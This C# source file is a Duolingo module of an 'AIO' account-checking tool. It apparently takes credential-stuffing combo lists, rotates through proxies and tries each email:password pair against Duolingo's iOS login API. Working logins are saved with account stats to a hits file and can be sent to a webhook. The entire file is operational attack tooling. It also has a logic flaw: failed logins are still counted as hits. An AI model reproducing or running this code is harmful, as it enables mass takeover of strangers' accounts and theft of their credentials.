using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Duolingomod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text1 = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("Content-Type", "application/json");
                            req.UserAgent = "DuolingoMobile/6.14.1 (iPhone; iOS 12.0.1; Scale/2.00)";
                            var text = req.Post(new Uri("https://ios-api-2.duolingo.com/2017-06-30/login"),
                                    new BytesContent(Encoding.Default.GetBytes("{\"password\":\"" + array[1] +
                                                                               "\",\"fields\":\"_achievements,adsConfig{units},bio,coachOutfit,courses{authorId,healthEnabled,fromLanguage,id,learningLanguage,placementTestAvailable,title,xp},creationDate,currencyRewardBundles,currentCourse{authorId,checkpointTests,healthEnabled,extraCrowns,fluency,fromLanguage,id,learningLanguage,placementTestAvailable,progressQuizHistory,progressVersion,skills{accessible,bonus,conversations,explanation,finishedLessons,finishedLevels,iconId,id,indicatingNewContent,lessons,levels,name,progressRemaining,shortName,strength,urlName},sections,smartTips,status,title,trackingProperties,xp},email,enableMicrophone,enableSoundEffects,enableSpeaker,experiments,facebookId,fromLanguage,gems,gemsConfig,googleId,health,id,inviteURL,joinedClassroomIds,learningLanguage,lingots,location,motivation,name,observedClassroomIds,optionalFeatures,persistentNotifications,phoneNumber,picture,plusDiscounts,practiceReminderSettings,privacySettings,pushClubs,pushLeaderboards,requiresParentalConsent,referralInfo,roles,shopItems{id,purchaseDate,purchasePrice,subscriptionInfo{renewer},wagerDay},streakData,timezone,timezoneOffset,totalXp,trackingProperties,username,weeklyXp,xpConfig,xpGains{time, xp},zhTw\",\"identifier\":\"" +
                                                                               array[0] +
                                                                               "\",\"distinctId\":\"EE2C72B5-A05E-42F9-9C09-928DEF7C4BF2\"}")))
                                .ToString();
                            if (!text.Contains("learningLanguage\""))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }

                            Program.Hits++;
                            Program.TotalChecks++;
                            var value = Regex.Match(text, "total_crowns\":(.*?),").Groups[1].Value;
                            var value2 = Regex.Match(text, "learningLanguage\":\"(.*?)\"").Groups[1].Value;
                            var value3 = Regex.Match(text, "\"lingots\":(.*?),").Groups[1].Value;
                            var value4 = Regex.Match(text, "totalXp\":(.*?),").Groups[1].Value;
                            var value5 = Regex.Match(text, "streak\":(.*?),").Groups[1].Value;
                            Export.AsResult("/Duolingo_hits",
                                array[0] + ":" + array[1] + " | Crowns: " + value + " - Learning Language: " + value2 +
                                " - Lingots: " + value3 + " - XP: " + value4 + " - Streak: " + value5);
                            if (Program.lorc == "LOG")
                                Settings.PrintHit("Duolingo",
                                    array[0] + ":" + array[1] + " | Crowns: " + value + " - Learning Language: " +
                                    value2 + " - Lingots: " + value3 + " - XP: " + value4 + " - Streak: " + value5);
                            if (Settings.sendToWebhook)
                                Settings.sendTowebhook1(
                                    array[0] + ":" + array[1] + " | Crowns: " + value + " - Learning Language: " +
                                    value2 + " - Lingots: " + value3 + " - XP: " + value4 + " - Streak: " + value5,
                                    "Duolingo Hits");
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text1);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}